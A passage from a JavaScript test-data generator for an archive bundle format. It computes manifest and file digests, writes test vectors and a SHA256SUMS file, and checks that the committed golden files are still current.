    // The manifest digest is over the bytes at OFFSET ZERO — the local file
    // header — because that is what a reader who trusts nothing else can get
    // to. `manifest-not-first` and `manifest-compressed` have no readable
    // manifest there by construction, so they record null and carry the
    // digest of the bytes they *meant* separately: a consumer that computed
    // one anyway would be reading either another entry's content or a deflate
    // stream, and would then have a plausible 64-character answer to compare
    // against, which is worse than having none.
    manifest_sha256: manifestAtOffsetZero(v) ? sha256(v.archive.manifestBytes) : null,
    manifest_digest: manifestAtOffsetZero(v) ? manifestDigest(v.archive.manifestBytes) : null,
    ...(v.archive.manifestBytes && !manifestAtOffsetZero(v)
      ? {
          manifest_sha256_intended: sha256(v.archive.manifestBytes),
          manifest_digest_intended: manifestDigest(v.archive.manifestBytes),
        }
      : {}),
    legacy_concat_sha256: legacyConcatDigest(v.archive.entries),
    expect: v.expect,
    ...(v.archive.manifestBytesCentral
      ? {
          manifest_sha256_central: sha256(v.archive.manifestBytesCentral),
          manifest_digest_central: manifestDigest(v.archive.manifestBytesCentral),
        }
      : {}),
    ...(v.extra ?? {}),
    ...(v.divergence ? { divergence: v.divergence } : {}),
  };
  outputs.push({ file, bytes, record });
}

const doc = {
  schema: "astra.testdata.bundles/1",
  generated_by: "testdata/bundles/generate.mjs",
  bundle_schema: "astra.bundle/2",
  manifest_digest_domain: "astra.bundle/2\\0",
  note:
    "`verdict` is the answer the format's rules give. `expect` is what each implementation " +
    "does today and is what the three suites assert; where it differs from `verdict` there " +
    "is a `divergence` recording why, and closing that gap turns a suite red until the " +
    "entry is removed. `legacy_concat_sha256` is the RETIRED in-ZIP digest, computed here " +
    "only so the collision pair can be shown to share one.",
  vectors: outputs.map((o) => o.record),
};

const check = process.argv.includes("--check");
let changed = [];

function emit(name, content) {
  const p = path.join(HERE, name);
  const existing = fs.existsSync(p) ? fs.readFileSync(p) : null;
  const want = Buffer.isBuffer(content) ? content : Buffer.from(content, "utf8");
  if (existing && existing.equals(want)) return;
  if (check) {
    changed.push(name);
    return;
  }
  fs.writeFileSync(p, want);
}

const vectorsJson = Buffer.from(JSON.stringify(doc, null, 2) + "\n", "utf8");

// SHA256SUMS covers every file a consumer vendors — the bundles and
// `vectors.json` — in `sha256sum`-compatible form, so `sha256sum -c SHA256SUMS`
// checks a vendored copy with no tooling of ours in the loop. It is computed
// from the buffers this run produced, never by re-reading the directory: a sums
// file derived from whatever happens to be on disk would certify a stale
// golden as faithfully as a fresh one.
const vendored = [...outputs.map((o) => ({ file: o.file, bytes: o.bytes })), { file: "vectors.json", bytes: vectorsJson }];
vendored.sort((a, b) => (a.file < b.file ? -1 : a.file > b.file ? 1 : 0));
const sums = vendored.map((v) => `${sha256(v.bytes)}  ${v.file}`).join("\n") + "\n";

for (const o of outputs) emit(o.file, o.bytes);
emit("vectors.json", vectorsJson);
emit("SHA256SUMS", sums);

if (check && changed.length) {
  console.error(`testdata/bundles is stale — these would change:\n  ${changed.join("\n  ")}`);
  console.error("Run: node testdata/bundles/generate.mjs");
  process.exit(1);
}

console.log(`${outputs.length} vectors${check ? " (checked, unchanged)" : " written"} in ${HERE}`);
for (const o of outputs) {
  const d = o.record.divergence ? `  [${o.record.divergence.finding}]` : "";
  console.log(`  ${o.record.verdict.padEnd(6)} ${o.file.padEnd(34)} ${o.record.artifact_sha256.slice(0, 16)}…${d}`);
}
